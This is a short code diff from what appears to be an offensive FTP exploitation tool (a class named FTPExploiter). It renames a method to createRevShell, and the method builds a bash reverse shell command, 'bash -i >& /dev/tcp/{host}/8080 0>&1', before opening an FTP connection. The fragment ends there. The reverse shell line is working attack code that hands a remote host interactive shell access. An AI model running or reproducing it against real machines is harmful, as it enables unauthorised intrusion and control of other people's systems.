@@ -22,7 +22,7 @@ class FTPExploiter(ProtocolScanner):
 	def __init__(self, protocolName, portNumber, IPAddress, macaddress):
 		super(FTPExploiter, self).__init__(protocolName, portNumber, IPAddress, macaddress)
 	#have to finish the function signature. And find out what's host and port
-	def verifyCredentials(self, credentials, host):
+	def createRevShell(self, credentials, host):
 		shell = "bash -i >& /dev/tcp/{}/8080 0>&1".format(host)
 		try:
 			ftp = ftplib.FTP()
